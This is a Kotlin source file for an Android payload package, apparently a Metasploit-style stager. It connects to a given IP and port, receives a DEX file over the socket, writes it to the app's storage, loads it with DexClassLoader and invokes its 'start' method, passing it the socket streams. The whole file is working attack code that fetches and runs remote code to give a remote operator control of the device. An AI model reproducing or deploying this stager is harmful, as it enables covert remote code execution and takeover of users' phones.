package xyz.linglitel.msf_payload_android_l

import android.util.Log
import dalvik.system.DexClassLoader
import java.io.DataInputStream
import java.io.DataOutputStream
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.io.OutputStream
import java.net.Socket
import kotlin.random.Random

class Payload1 {

    lateinit var socket: Socket
    val context = BaseApplication.mContext

    fun startPayload(
        dataInputStream: DataInputStream = DataInputStream(socket.inputStream),
        outputStream: OutputStream = DataOutputStream(socket.outputStream)
    ) {
        try {
            val dexOutputDir: File = context.getCodeCacheDir()
            dexOutputDir.setReadOnly()
            val path = context.filesDir.toString()
            val filePath = "$path${File.separatorChar}${Random.nextInt(Int.MAX_VALUE).toString(36)}"
            val jarPath = "$filePath.jar";
            val dexPath = "$filePath.dex";
            val payload = getPayload(dataInputStream = dataInputStream)
            val dexFile = String(payload)
            val file = File(dexPath)
            if (!file.exists()) {
                file.createNewFile()
            }
            val fileOutputStream = FileOutputStream(file)
            fileOutputStream.write(payload)
            fileOutputStream.flush()
            fileOutputStream.close()
            File(dexPath).setReadOnly()
            val loadClass =
                DexClassLoader(jarPath, path, path, Payload1::class.java.classLoader).loadClass(
                    dexFile
                )
            val newInstance = loadClass.getDeclaredConstructor().newInstance()
            //file.delete()
            //File(dexPath).delete()
            val Object = arrayOf(path, null)
            loadClass.getMethod(
                "start",
                DataInputStream::class.java,
                OutputStream::class.java,
                Array<Any>::class.java
            ).invoke(newInstance, dataInputStream, outputStream, Object[0]);
        } catch (e: Exception) {
        }

    }

    fun getPayload(dataInputStream: DataInputStream): ByteArray {
        var readInt = dataInputStream.readInt()
        val bArr = ByteArray(readInt)

        var i = 0
        while (i < readInt) {
            val read = dataInputStream.read(bArr, i, readInt - i)
            if (read < 0) {
                throw IOException("Unexpected end of stream")
            }
            i += read
        }

        return bArr
    }

    fun startConnect(ip: String, port: Int) {
        try {
            socket = Socket(ip, port)
        } catch (e: Exception) {
            Log.e("startConnect",e.toString())
        }
    }
}